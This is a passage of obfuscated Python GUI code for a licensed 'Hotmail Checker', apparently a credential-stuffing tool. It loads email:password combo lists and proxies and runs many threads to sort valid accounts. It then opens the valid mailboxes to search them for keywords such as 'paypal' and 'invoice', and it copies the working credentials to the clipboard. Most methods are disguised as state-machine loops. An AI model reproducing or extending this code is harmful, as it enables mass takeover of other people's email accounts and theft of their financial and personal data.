            elif state == 486534:
                btn2.clicked.connect(lambda: self.accept())
                state = 831208
            elif state == 831208:
                acc.addWidget(btn2)
                state = 754968
            elif state == 754968:
                item.addLayout(acc)
                state = -1
            else:
                break

    def _populate(self, items):
        self.list.clear()
        for resp in items:
            email = resp.get('email', '?')
            info = resp.get('info', {})
            inbox_n = info.get('inbox', 0)
            total = info.get('total', 0)
            _163_46c9fc = '  ·  SMTP' if resp.get('smtp_ok') else ''
            location = info.get('location', '?')
            kw_details = info.get('kw_details', {})
            if kw_details:
                match_list = []
                match_n = 0
                for kw2, kw_info2 in kw_details.items():
                    total_count = kw_info2[0].get('count', len(kw_info2)) if kw_info2 else 0
                    match_n += total_count
                    match_list.append(f'{kw2}({total_count})')
                hits_label = f"  ·  🎯 {len(kw_details)} hits [{match_n} matches: {', '.join(match_list)}]"
            else:
                hits_label = ''
            prov_key = f'{email}  ·  {location}  ·  inbox: {inbox_n}  ·  total: {total}{_163_46c9fc}{hits_label}'
            msg = QListWidgetItem(prov_key)
            msg.setIcon(make_icon_from_name('mail', 14, Colors.ACCENT if resp.get('smtp_ok') else Colors.TEXT_SOFT))
            self.list.addItem(msg)

    def _filter(self, text):
        state = 617639
        while True:
            if state == 617639:
                text = text.strip().lower()
                state = 584412
            elif state == 584412:
                if not text:
                    self._populate(self.valid)
                    return
                state = 349765
            elif state == 349765:
                self._populate([resp for resp in self.valid if text in resp.get('email', '').lower()])
                state = -1
            else:
                break

    def _open_viewer(self, msg):
        state = 164490
        while True:
            if state == 164490:
                if not msg:
                    return
                state = 537251
            elif state == 537251:
                pos = self.list.row(msg)
                state = 336671
            elif state == 336671:
                if pos < 0 or pos >= len(self.valid):
                    return
                state = 622080
            elif state == 622080:
                resp = self.valid[pos]
                state = 257974
            elif state == 257974:
                kw_details = resp.get('info', {}).get('kw_details', {})
                state = 527352
            elif state == 527352:
                search_kws = ''
                state = 900447
            elif state == 900447:
                if kw_details:
                    search_kws = list(kw_details.keys())[0]
                state = 940479
            elif state == 940479:
                sess_win = SessionsWindow(resp, search_keywords=search_kws, parent=None)
                state = 448533
            elif state == 448533:
                sess_win.show()
                state = 913254
            elif state == 913254:
                sess_win.raise_()
                state = 409132
            elif state == 409132:
                sess_win.activateWindow()
                state = 114920
            elif state == 114920:
                self._viewers.append(sess_win)
                state = 104168
            elif state == 104168:
                if self.parent() and hasattr(self.parent(), '_all_viewers'):
                    self.parent()._all_viewers.append(sess_win)
                state = -1
            else:
                break

    def _copy_selected(self):
        items = self.list.selectedItems()
        if not items:
            return
        lines_out2 = []
        for _82_6792e7 in items:
            pos = self.list.row(_82_6792e7)
            if 0 <= pos < len(self.valid):
                resp = self.valid[pos]
                lines_out2.append(f"{resp.get('email', '')}:{resp.get('pw', '')}")
        QApplication.clipboard().setText('\n'.join(lines_out2))
        QMessageBox.information(self, 'Copied', f'Copied {len(lines_out2)} account(s) to clipboard')

class WebhookProvider:
    def __init__(self):
        self.enabled = False
        self.push_count = 0

    def is_enabled(self) -> bool:
        return False

    def fetch_keywords(self) -> list:
        return []

    def push(self, *, source, hit_type, title, data, keywords=None, tool_name=None):
        return (False, {'disabled': True})

    def push_background(self, **kwargs):
        return

    def add_to_batch(self, hit_type, _2a0_0ff10d, keywords=None, source='hotmail-checker'):
        return

    def flush_batch(self, keywords=None, source='hotmail-checker'):
        return
val6 = None

def load_announcements_alt():
    global val6
    if val6 is None:
        val6 = WebhookProvider()
    return val6

def send_hit_webhook(*, hit_type, title, data, keywords=None, source='hotmail-checker'):
    return

class MainWindow(QMainWindow):

    def __init__(self, license_key=''):
        super().__init__()
        self.license_key = license_key
        self.setWindowTitle(app_name)
        self.setWindowIcon(make_icon(32))
        self.resize(1360, 860)
        self.setMinimumSize(960, 640)
        self.accounts = []
        self.valid_accounts = []
        self._valid_lock = _threading.Lock()
        self.running = self.paused = False
        self.worker = None
        self._logs = []
        self._log_filter = 'all'
        self._log_buffer = collections.deque(maxlen=5000)
        self._log_flush_timer = QTimer(self)
        self._log_flush_timer.setInterval(120)
        self._log_flush_timer.timeout.connect(self._flush_log)
        self._log_flush_timer.start()
        self.threads_var = 15
        self.smtp_enabled = False
        self.t_start = None
        self.t_boot = time.time()
        self.nc = 0
        self.nv = 0
        self.nb = 0
        self.ne = 0
        self.nad = 0
        self.n_hits = 0
        self.n_smtp = 0
        self.n_emails = 0
        self.root = self
        self._valid_dlg = None
        self._all_viewers = []
        self._build()
        self._tick()
        self._key_check_loop()
        self._fetch_announcements_async()
        self._setup_memory_cleanup()
        try:
            self._tg_bot = Config(self)
            self._tg_bot.start()
        except Exception:
            self._tg_bot = None
        results_dir.mkdir(parents=True, exist_ok=True)

    def _build(self):
        state = 800301
        while True:
            if state == 800301:
                widget = QWidget()
                state = 990128
            elif state == 990128:
                self.setCentralWidget(widget)
                state = 888561
            elif state == 888561:
                item = QVBoxLayout(widget)
                state = 140936
            elif state == 140936:
                item.setContentsMargins(0, 0, 0, 0)
                state = 676885
            elif state == 676885:
                item.setSpacing(0)
                state = 641967
            elif state == 641967:
                self._header(item)
                state = 823251
            elif state == 823251:
                self._statsbar(item)
                state = 415768
            elif state == 415768:
                self._body(item)
                state = -1
            else:
                break

    def _header(self, title):
        state = 1030955
        while True:
            if state == 1030955:
                frame2 = QFrame()
                state = 304421
            elif state == 304421:
                frame2.setFixedHeight(60)
                state = 389936
            elif state == 389936:
                frame2.setStyleSheet(f'.QFrame {{ background: {Colors.BG_ELEVATED}; border-bottom: 1px solid {Colors.BORDER}; }}')
                state = 931362
            elif state == 931362:
                key_hash = QHBoxLayout(frame2)
                state = 401902
            elif state == 401902:
                key_hash.setContentsMargins(Colors.SP_LG, Colors.SP_SM, Colors.SP_LG, Colors.SP_SM)
                state = 384426
            elif state == 384426:
                key_hash.setSpacing(Colors.SP_MD)
                state = 652331
            elif state == 652331:
                self.logo_lbl = QLabel()
                state = 437413
            elif state == 437413:
                self.logo_lbl.setFixedSize(36, 36)
                state = 843362
            elif state == 843362:
                self.logo_lbl.setPixmap(make_icon_alt(36))
                state = 661104
            elif state == 661104:
                self.logo_lbl.setScaledContents(False)
                state = 486885
            elif state == 486885:
                self.logo_lbl.setStyleSheet('background: transparent; border: none;')
                state = 211460
            elif state == 211460:
                key_hash.addWidget(self.logo_lbl)
                state = 556877
            elif state == 556877:
                hbox2 = QVBoxLayout()
                state = 638818
            elif state == 638818:
                hbox2.setSpacing(0)
                state = 363223
            elif state == 363223:
                hbox5 = QHBoxLayout()
                state = 409926
            elif state == 409926:
                hbox5.setSpacing(6)
                state = 423379
            elif state == 423379:
                lbl15 = QLabel('Hotmail')
                state = 601512
            elif state == 601512:
                lbl15.setStyleSheet(f'font-size: {Colors.FS_LG}px; font-weight: {Colors.FW_BOLD}; color: {Colors.TEXT};')
                state = 650076
            elif state == 650076:
                lbl16 = QLabel('Checker')
                state = 224427
            elif state == 224427:
                lbl16.setStyleSheet(f'font-size: {Colors.FS_LG}px; font-weight: {Colors.FW_NORMAL}; color: {Colors.TEXT_SOFT};')
                state = 596580
            elif state == 596580:
                lbl17 = QLabel(f'  v{version}')
                state = 639695
            elif state == 639695:
                lbl17.setStyleSheet(f'font-size: {Colors.FS_CAPTION}px; color: {Colors.TEXT_MUTED};')
                state = 587165
            elif state == 587165:
                hbox5.addWidget(lbl15)
                state = 309012
            elif state == 309012:
                hbox5.addWidget(lbl16)
                state = 675695
            elif state == 675695:
                hbox5.addWidget(lbl17)
                state = 896539
            elif state == 896539:
                hbox5.addStretch(1)
                state = 250437
            elif state == 250437:
                hbox2.addLayout(hbox5)
                state = 246366
            elif state == 246366:
                self.news_lbl = QLabel('')
                state = 698715
            elif state == 698715:
                self.news_lbl.setStyleSheet(f'font-size: {Colors.FS_CAPTION}px; color: {Colors.TEXT_MUTED};')
                state = 101722
            elif state == 101722:
                hbox2.addWidget(self.news_lbl)
                state = 862181
            elif state == 862181:
                key_hash.addLayout(hbox2)
                state = 66932
            elif state == 66932:
                key_hash.addStretch(1)
                state = 497199
            elif state == 497199:
                vbox4 = QVBoxLayout()
                state = 766857
            elif state == 766857:
                vbox4.setSpacing(2)
                state = 1042632
            elif state == 1042632:
                self.lic_status = QLabel('● Licensed')
                state = 762936
            elif state == 762936:
                self.lic_status.setStyleSheet(f'color: {Colors.SUCCESS}; font-size: {Colors.FS_CAPTION}px; font-weight: {Colors.FW_SEMI}; background: {Colors.BG}; padding: 4px 10px; border-radius: {Colors.R_PILL}px; border: 1px solid {Colors.BORDER};')
                state = 442637
            elif state == 442637:
                self.lic_status.setAlignment(Qt.AlignmentFlag.AlignCenter)
                state = 547613
            elif state == 547613:
                hbox4 = QHBoxLayout()
                state = 216414
            elif state == 216414:
                hbox4.setContentsMargins(0, 0, 0, 0)
                state = 618397
            elif state == 618397:
                hbox4.setSpacing(0)
                state = 825531
            elif state == 825531:
                hbox4.addStretch(1)
                state = 477289
            elif state == 477289:
                hbox4.addWidget(self.lic_status)
                state = 728490
            elif state == 728490:
                vbox4.addLayout(hbox4)
                state = 959273
            elif state == 959273:
                self.uptime_lbl = QLabel('00:00:00')
                state = 913362
            elif state == 913362:
                self.uptime_lbl.setStyleSheet(f'color: {Colors.TEXT_SOFT}; font-family: {Colors.FONT_MONO}; font-size: {Colors.FS_SMALL}px;')
                state = 998129
            elif state == 998129:
                self.uptime_lbl.setAlignment(Qt.AlignmentFlag.AlignRight)
                state = 345798
            elif state == 345798:
                vbox4.addWidget(self.uptime_lbl)
                state = 423098
            elif state == 423098:
                key_hash.addLayout(vbox4)
                state = 761157
            elif state == 761157:
                title.addWidget(frame2)
                state = -1
            else:
                break

    def _statsbar(self, title):
        frame2 = QFrame()
        frame2.setFixedHeight(48)
        frame2.setStyleSheet(f'.QFrame {{ background: {Colors.BG}; border-bottom: 1px solid {Colors.BORDER}; }}')
        key_hash = QHBoxLayout(frame2)
        key_hash.setContentsMargins(Colors.SP_LG, Colors.SP_SM, Colors.SP_LG, Colors.SP_SM)
        key_hash.setSpacing(Colors.SP_SM)
        self._pills = {}
        for icon_name, lbl, sv, clr in [('check', 'Valid', 'sv', Colors.SUCCESS), ('close', 'Invalid', 'sb', Colors.DANGER), ('alert', 'Errors', 'se', Colors.WARNING), ('mail', 'Hits', 'sh', Colors.PURPLE)]:
            key_hash.addWidget(self._make_pill(icon_name, lbl, sv, clr))
        key_hash.addStretch(1)
        parent_w = QFrame()
        parent_w.setStyleSheet(f'.QFrame {{ background: {Colors.BG_ELEVATED}; border: 1px solid {Colors.BORDER}; border-radius: {Colors.R_PILL}px; }}')
        hbox7 = QHBoxLayout(parent_w)
        hbox7.setContentsMargins(Colors.SP_MD, 4, Colors.SP_MD, 4)
        hbox7.setSpacing(6)
        lbl18 = QLabel('⚡')
        lbl18.setStyleSheet(f'color: {Colors.INFO}; font-size: {Colors.FS_SMALL}px;')
        hbox7.addWidget(lbl18)
        lbl19 = QLabel('CPM')
        lbl19.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px; font-weight: {Colors.FW_SEMI};')
        hbox7.addWidget(lbl19)
        self.cpm = QLabel('0')
        self.cpm.setStyleSheet(f'color: {Colors.INFO}; font-family: {Colors.FONT_MONO}; font-size: {Colors.FS_BODY}px; font-weight: {Colors.FW_BOLD};')
        hbox7.addWidget(self.cpm)
        key_hash.addWidget(parent_w)
        self.prog_indicator = QLabel('● 0/0')
        self.prog_indicator.setStyleSheet(f'color: {Colors.ACCENT}; font-family: {Colors.FONT_MONO}; font-size: {Colors.FS_SMALL}px; font-weight: {Colors.FW_BOLD}; padding-left: {Colors.SP_SM}px;')
        key_hash.addWidget(self.prog_indicator)
        self.proxy_status = QLabel('')
        self.proxy_status.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-family: {Colors.FONT_MONO}; font-size: {Colors.FS_CAPTION}px; padding-left: {Colors.SP_SM}px;')
        key_hash.addWidget(self.proxy_status)
        title.addWidget(frame2)

    def _make_pill(self, icon_name, lbl, sv, clr):
        folder = QFrame()
        folder.setStyleSheet(f'.QFrame {{ background: {Colors.BG_ELEVATED}; border: 1px solid {Colors.BORDER}; border-radius: {Colors.R_PILL}px; }}')
        hbox = QHBoxLayout(folder)
        hbox.setContentsMargins(Colors.SP_MD, 4, Colors.SP_MD, 4)
        hbox.setSpacing(6)
        icon_lbl = QLabel()
        icon_lbl.setPixmap(getattr(SettingsDialog, icon_name)(12, clr))
        icon_lbl.setStyleSheet('background: transparent;')
        hbox.addWidget(icon_lbl)
        name_lbl = QLabel(lbl)
        name_lbl.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px; font-weight: {Colors.FW_SEMI}; background: transparent;')
        hbox.addWidget(name_lbl)
        val_lbl = QLabel('0')
        val_lbl.setObjectName('Stat')
        val_lbl.setStyleSheet(f'color: {clr}; font-family: {Colors.FONT_MONO}; font-size: {Colors.FS_BODY}px; font-weight: {Colors.FW_BOLD}; background: transparent;')
        hbox.addWidget(val_lbl)
        setattr(self, sv, val_lbl)
        return folder

    def _body(self, title):
        state = 828439
        while True:
            if state == 828439:
                splitter = QSplitter(Qt.Orientation.Horizontal)
                state = 627382
            elif state == 627382:
                splitter.setHandleWidth(1)
                state = 508720
            elif state == 508720:
                splitter.setChildrenCollapsible(False)
                state = 87159
            elif state == 87159:
                splitter.setStyleSheet(f'QSplitter {{ background: {Colors.BORDER}; }}')
                state = 926015
            elif state == 926015:
                sb = self._build_sidebar()
                state = 757604
            elif state == 757604:
                sb.setMaximumWidth(220)
                state = 952305
            elif state == 952305:
                sb.setMinimumWidth(180)
                state = 323866
            elif state == 323866:
                splitter.addWidget(sb)
                state = 236582
            elif state == 236582:
                _293_c8dc5b = self._build_logpane()
                state = 558373
            elif state == 558373:
                splitter.addWidget(_293_c8dc5b)
                state = 745001
            elif state == 745001:
                hbox4 = self._build_right_panel()
                state = 879451
            elif state == 879451:
                hbox4.setMaximumWidth(300)
                state = 895188
            elif state == 895188:
                hbox4.setMinimumWidth(220)
                state = 83671
            elif state == 83671:
                splitter.addWidget(hbox4)
                state = 148635
            elif state == 148635:
                splitter.setStretchFactor(0, 0)
                state = 127415
            elif state == 127415:
                splitter.setStretchFactor(1, 1)
                state = 270930
            elif state == 270930:
                splitter.setStretchFactor(2, 0)
                state = 88816
            elif state == 88816:
                splitter.setSizes([200, 880, 260])
                state = 586380
            elif state == 586380:
                title.addWidget(splitter, 1)
                state = -1
            else:
                break

    def _build_sidebar(self):
        state = 565186
        while True:
            if state == 565186:
                scroll = QScrollArea()
                state = 619472
            elif state == 619472:
                scroll.setWidgetResizable(True)
                state = 928564
            elif state == 928564:
                scroll.setFrameShape(QFrame.Shape.NoFrame)
                state = 502016
            elif state == 502016:
                scroll.setStyleSheet(f'QScrollArea {{ background: {Colors.BG_ELEVATED}; border: none; border-right: 1px solid {Colors.BORDER}; }}')
                state = 925410
            elif state == 925410:
                worker = QWidget()
                state = 109677
            elif state == 109677:
                worker.setStyleSheet(f'.QWidget {{ background: {Colors.BG_ELEVATED}; }}')
                state = 112707
            elif state == 112707:
                worker.setMinimumWidth(190)
                state = 416520
            elif state == 416520:
                worker.setMaximumWidth(240)
                state = 662679
            elif state == 662679:
                item = QVBoxLayout(worker)
                state = 226296
            elif state == 226296:
                item.setContentsMargins(Colors.SP_MD, Colors.SP_LG, Colors.SP_MD, Colors.SP_LG)
                state = 905101
            elif state == 905101:
                item.setSpacing(4)
                state = 530649
            elif state == 530649:
                item.addWidget(make_section('Controls'))
                state = 530898
            elif state == 530898:
                item.addSpacing(2)
                state = 595679
            elif state == 595679:
                self.b_start = QPushButton('  Start  ')
                state = 239481
            elif state == 239481:
                self.b_start.setObjectName('Primary')
                state = 436195
            elif state == 436195:
                self.b_start.setIcon(make_icon_from_name('play', 14, Colors.BG))
                state = 690416
            elif state == 690416:
                self.b_start.setMinimumHeight(38)
                state = 505216
            elif state == 505216:
                self.b_start.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 88003
            elif state == 88003:
                self.b_start.clicked.connect(lambda: self._start())
                state = 286023
            elif state == 286023:
                Theme(self.b_start, 'Start checking  (F5)')
                state = 719055
            elif state == 719055:
                item.addWidget(self.b_start)
                state = 382448
            elif state == 382448:
                hbox18 = QHBoxLayout()
                state = 170558
            elif state == 170558:
                hbox18.setSpacing(4)
                state = 1024108
            elif state == 1024108:
                self.b_pause = QPushButton('Pause')
                state = 550860
            elif state == 550860:
                self.b_pause.setObjectName('Warn')
                state = 396581
            elif state == 396581:
                self.b_pause.setEnabled(False)
                state = 752875
            elif state == 752875:
                self.b_pause.setMinimumHeight(34)
                state = 215620
            elif state == 215620:
                self.b_pause.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 287496
            elif state == 287496:
                self.b_pause.clicked.connect(lambda: self._pause())
                state = 70117
            elif state == 70117:
                Theme(self.b_pause, 'Pause / resume')
                state = 282820
            elif state == 282820:
                hbox18.addWidget(self.b_pause)
                state = 326248
            elif state == 326248:
                self.b_stop = QPushButton('Stop')
                state = 1005858
            elif state == 1005858:
                self.b_stop.setObjectName('Danger')
                state = 126990
            elif state == 126990:
                self.b_stop.setEnabled(False)
                state = 837528
            elif state == 837528:
                self.b_stop.setMinimumHeight(34)
                state = 360763
            elif state == 360763:
                self.b_stop.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 492930
            elif state == 492930:
                self.b_stop.clicked.connect(lambda: self._stop())
                state = 434819
            elif state == 434819:
                Theme(self.b_stop, 'Stop checking')
                state = 164470
            elif state == 164470:
                hbox18.addWidget(self.b_stop)
                state = 258726
            elif state == 258726:
                item.addLayout(hbox18)
                state = 726406
            elif state == 726406:
                item.addSpacing(Colors.SP_MD)
                state = 387821
            elif state == 387821:
                item.addWidget(make_section_alt3())
                state = 601833
            elif state == 601833:
                item.addSpacing(Colors.SP_SM)
                state = 293736
            elif state == 293736:
                item.addWidget(make_section('Load'))
                state = 1000111
            elif state == 1000111:
                item.addSpacing(2)
                state = 387753
            elif state == 387753:
                combo_btn = QPushButton('  Combo File')
                state = 310344
            elif state == 310344:
                combo_btn.setIcon(make_icon_from_name('upload', 14, Colors.TEXT_SOFT))
                state = 348330
            elif state == 348330:
                combo_btn.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 1034934
            elif state == 1034934:
                combo_btn.clicked.connect(lambda: self._load_combo())
                state = 950474
            elif state == 950474:
                Theme(combo_btn, 'Load combo list  (Ctrl+O)')
                state = 423953
            elif state == 423953:
                item.addWidget(combo_btn)
                state = 416326
            elif state == 416326:
                kw_btn = QPushButton('  Keywords File')
                state = 378264
            elif state == 378264:
                kw_btn.setIcon(make_icon_from_name('search', 14, Colors.TEXT_SOFT))
                state = 508533
            elif state == 508533:
                kw_btn.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 766354
            elif state == 766354:
                kw_btn.clicked.connect(lambda: self._load_keywords())
                state = 594367
            elif state == 594367:
                Theme(kw_btn, 'Load keywords to search in emails')
                state = 216790
            elif state == 216790:
                item.addWidget(kw_btn)
                state = 317035
            elif state == 317035:
                item.addSpacing(Colors.SP_MD)
                state = 628170
            elif state == 628170:
                item.addWidget(make_section_alt3())
                state = 173179
            elif state == 173179:
                item.addSpacing(Colors.SP_SM)
                state = 1042380
            elif state == 1042380:
                item.addWidget(make_section('Proxy'))
                state = 352964
            elif state == 352964:
                item.addSpacing(2)
                state = 816519
            elif state == 816519:
                load_proxy_btn = QPushButton('  Load Proxy')
                state = 98259
            elif state == 98259:
                load_proxy_btn.setIcon(make_icon_from_name('upload', 14, Colors.TEXT_SOFT))
                state = 285064
            elif state == 285064:
                load_proxy_btn.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 416184
            elif state == 416184:
                load_proxy_btn.clicked.connect(lambda: self._load_proxy())
                state = 96858
            elif state == 96858:
                item.addWidget(load_proxy_btn)
                state = 771563
            elif state == 771563:
                paste_proxy_btn = QPushButton('  Paste Proxy')
                state = 794441
            elif state == 794441:
                paste_proxy_btn.setIcon(make_icon_from_name('copy', 14, Colors.TEXT_SOFT))
                state = 223508
            elif state == 223508:
                paste_proxy_btn.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 1038713
            elif state == 1038713:
                paste_proxy_btn.clicked.connect(lambda: self._paste_proxy())
                state = 675562
            elif state == 675562:
                item.addWidget(paste_proxy_btn)
                state = 141214
            elif state == 141214:
                remove_proxy_btn = QPushButton('  Remove Proxy')
                state = 627334
            elif state == 627334:
                remove_proxy_btn.setIcon(make_icon_from_name('trash', 14, Colors.TEXT_SOFT))
                state = 608321
            elif state == 608321:
                remove_proxy_btn.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 563532
            elif state == 563532:
                remove_proxy_btn.clicked.connect(lambda: self._remove_proxy())
                state = 577424
            elif state == 577424:
                item.addWidget(remove_proxy_btn)
                state = 721813
            elif state == 721813:
                hbox8 = QHBoxLayout()
                state = 959591
            elif state == 959591:
                hbox8.setSpacing(4)
                state = 258113
            elif state == 258113:
                lbl20 = QLabel('Type')
                state = 337150
            elif state == 337150:
                lbl20.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px;')
                state = 119164
            elif state == 119164:
                hbox8.addWidget(lbl20)
                state = 1020407
            elif state == 1020407:
                hbox8.addStretch(1)
                state = 83394
            elif state == 83394:
                self.proxy_type_cb = QComboBox()
                state = 751669
            elif state == 751669:
                self.proxy_type_cb.addItems(['HTTP', 'HTTPS', 'SOCKS5', 'SOCKS4'])
                state = 664607
            elif state == 664607:
                self.proxy_type_cb.setFixedWidth(88)
                state = 828196
            elif state == 828196:
                self.proxy_type_cb.currentTextChanged.connect(self._on_proxy_type)
                state = 853327
            elif state == 853327:
                hbox8.addWidget(self.proxy_type_cb)
                state = 597376
            elif state == 597376:
                item.addLayout(hbox8)
                state = 66146
            elif state == 66146:
                self.proxy_lbl = QLabel('No proxies loaded')
                state = 896951
            elif state == 896951:
                self.proxy_lbl.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px; padding: 2px 4px;')
                state = 524315
            elif state == 524315:
                self.proxy_lbl.setWordWrap(True)
                state = 516436
            elif state == 516436:
                item.addWidget(self.proxy_lbl)
                state = 939721
            elif state == 939721:
                item.addSpacing(Colors.SP_MD)
                state = 358859
            elif state == 358859:
                item.addWidget(make_section_alt3())
                state = 184430
            elif state == 184430:
                item.addSpacing(Colors.SP_SM)
                state = 489703
            elif state == 489703:
                item.addWidget(make_section('Misc'))
                state = 449244
            elif state == 449244:
                item.addSpacing(2)
                state = 218549
            elif state == 218549:
                results_btn = QPushButton('  Results Folder')
                state = 197428
            elif state == 197428:
                results_btn.setIcon(make_icon_from_name('folder', 14, Colors.TEXT_SOFT))
                state = 164149
            elif state == 164149:
                results_btn.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 675590
            elif state == 675590:
                results_btn.clicked.connect(lambda: self._open_results())
                state = 364926
            elif state == 364926:
                Theme(results_btn, 'Open results folder')
                state = 569709
            elif state == 569709:
                item.addWidget(results_btn)
                state = 726646
            elif state == 726646:
                clear_log_btn = QPushButton('  Clear Log')
                state = 666383
            elif state == 666383:
                clear_log_btn.setIcon(make_icon_from_name('trash', 14, Colors.TEXT_SOFT))
                state = 1044607
            elif state == 1044607:
                clear_log_btn.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 605091
            elif state == 605091:
                clear_log_btn.clicked.connect(lambda: self._clear_log())
                state = 649032
            elif state == 649032:
                item.addWidget(clear_log_btn)
                state = 263659
            elif state == 263659:
                item.addStretch(1)
                state = 373497
            elif state == 373497:
                self.q_lbl = QLabel('No combo loaded')
                state = 472342
            elif state == 472342:
                self.q_lbl.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px; padding: 8px 4px;')
                state = 182405
            elif state == 182405:
                self.q_lbl.setWordWrap(True)
                state = 882224
            elif state == 882224:
                item.addWidget(self.q_lbl)
                state = 285428
            elif state == 285428:
                scroll.setWidget(worker)
                state = 613798
            elif state == 613798:
                return scroll
            else:
                break

    def _build_logpane(self):
        worker = QWidget()
        worker.setStyleSheet(f'.QWidget {{ background: {Colors.BG}; }}')
        item = QVBoxLayout(worker)
        item.setContentsMargins(Colors.SP_LG, Colors.SP_LG, Colors.SP_LG, Colors.SP_LG)
        item.setSpacing(Colors.SP_SM)
        hbox = QHBoxLayout()
        hbox.setSpacing(Colors.SP_SM)
        title = QLabel('Live Log')
        title.setStyleSheet(f'color: {Colors.TEXT}; font-size: {Colors.FS_LG}px; font-weight: {Colors.FW_BOLD};')
        hbox.addWidget(title)
        hbox.addStretch(1)
        viewer_btn = QPushButton('  Email Viewer  ')
        viewer_btn.setObjectName('Primary')
        viewer_btn.setIcon(make_icon_from_name('mail', 14, Colors.BG))
        viewer_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        viewer_btn.clicked.connect(lambda: self._show_valid_popup())
        Theme(viewer_btn, 'View valid accounts & open emails  (Ctrl+E)')
        hbox.addWidget(viewer_btn)
        item.addLayout(hbox)
        hbox9 = QHBoxLayout()
        hbox9.setSpacing(4)
        self._filter_btns = {}
        for lbl, filter_val in [('All', 'all'), ('Valid', 'valid'), ('Invalid', 'bad'), ('Hits', 'hit'), ('Errors', 'error')]:
            btn = QPushButton(lbl)
            btn.setObjectName('Chip')
            btn.setCheckable(True)
            btn.setChecked(filter_val == 'all')
            btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.clicked.connect(lambda checked, folder=filter_val: self._set_filter(folder))
            self._filter_btns[filter_val] = btn
            hbox9.addWidget(btn)
        hbox9.addStretch(1)
        self.log_counter = QLabel('0 / 0')
        self.log_counter.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-family: {Colors.FONT_MONO}; font-size: {Colors.FS_CAPTION}px;')
        hbox9.addWidget(self.log_counter)
        item.addLayout(hbox9)
        self.prog_lbl = QLabel('')
        self.prog_lbl.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-family: {Colors.FONT_MONO}; font-size: {Colors.FS_CAPTION}px;')
        item.addWidget(self.prog_lbl)
        self.prog = QProgressBar()
        item.addWidget(self.prog)
        self.log_box = QPlainTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setMaximumBlockCount(10000)
        item.addWidget(self.log_box, 1)
        return worker

    def _build_right_panel(self):
        state = 164970
        while True:
            if state == 164970:
                scroll = QScrollArea()
                state = 217160
            elif state == 217160:
                scroll.setWidgetResizable(True)
                state = 414056
            elif state == 414056:
                scroll.setFrameShape(QFrame.Shape.NoFrame)
                state = 960331
            elif state == 960331:
                scroll.setStyleSheet(f'QScrollArea {{ background: {Colors.BG_ELEVATED}; border: none; border-left: 1px solid {Colors.BORDER}; }}')
                state = 677397
            elif state == 677397:
                worker = QWidget()
                state = 966056
            elif state == 966056:
                worker.setStyleSheet(f'.QWidget {{ background: {Colors.BG_ELEVATED}; }}')
                state = 218982
            elif state == 218982:
                worker.setMinimumWidth(220)
                state = 587351
            elif state == 587351:
                worker.setMaximumWidth(300)
                state = 167885
            elif state == 167885:
                item = QVBoxLayout(worker)
                state = 105811
            elif state == 105811:
                item.setContentsMargins(Colors.SP_MD, Colors.SP_LG, Colors.SP_MD, Colors.SP_LG)
                state = 141278
            elif state == 141278:
                item.setSpacing(Colors.SP_SM)
                state = 208276
            elif state == 208276:
                kw_section = CollapsibleSection('Keywords', default_open=True)
                state = 163367
            elif state == 163367:
                self.kw_box = QPlainTextEdit()
                state = 227538
            elif state == 227538:
                self.kw_box.setPlaceholderText('Keywords (one per line):\n' + 'email@domain.com → search sender\n' + 'paypal, invoice, code → search all')
                state = 147687
            elif state == 147687:
                self.kw_box.setMaximumHeight(60)
                state = 633687
            elif state == 633687:
                self.kw_box.setStyleSheet(f'font-size: {Colors.FS_SMALL}px; font-family: {Colors.FONT_MONO};')
                state = 386365
            elif state == 386365:
                kw_section.addWidget(self.kw_box)
                state = 169013
            elif state == 169013:
                self.kw_lbl = QLabel('0 keywords')
                state = 626324
            elif state == 626324:
                self.kw_lbl.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px; padding: 1px 4px;')
                state = 444880
            elif state == 444880:
                self.kw_box.textChanged.connect(self._update_kw_count)
                state = 337985
            elif state == 337985:
                kw_section.addWidget(self.kw_lbl)
                state = 445629
            elif state == 445629:
                item.addWidget(kw_section)
                state = 945644
            elif state == 945644:
                threads_section = CollapsibleSection('Threads', default_open=True)
                state = 159715
            elif state == 159715:
                parent_w2 = QWidget()
                state = 804414
            elif state == 804414:
                parent_w2.setStyleSheet('background: transparent;')
                state = 294764
            elif state == 294764:
                hbox10 = QHBoxLayout(parent_w2)
                state = 438312
            elif state == 438312:
                hbox10.setContentsMargins(0, 0, 0, 0)
                state = 928503
            elif state == 928503:
                hbox10.setSpacing(Colors.SP_SM)
                state = 1037316
            elif state == 1037316:
                lbl21 = QLabel('Workers')
                state = 633366
            elif state == 633366:
                lbl21.setStyleSheet(f'color: {Colors.TEXT_SOFT}; font-size: {Colors.FS_BODY}px;')
                state = 548427
            elif state == 548427:
                hbox10.addWidget(lbl21)
                state = 187717
            elif state == 187717:
                hbox10.addStretch(1)
                state = 374956
            elif state == 374956:
                self.threads_spin = QSpinBox()
                state = 372762
            elif state == 372762:
                self.threads_spin.setRange(1, 300)
                state = 443093
            elif state == 443093:
                self.threads_spin.setValue(self.threads_var)
                state = 606589
            elif state == 606589:
                self.threads_spin.setFixedWidth(80)
                state = 718750
            elif state == 718750:
                self.threads_spin.valueChanged.connect(lambda machine_id2: setattr(self, 'threads_var', machine_id2))
                state = 727828
            elif state == 727828:
                hbox10.addWidget(self.threads_spin)
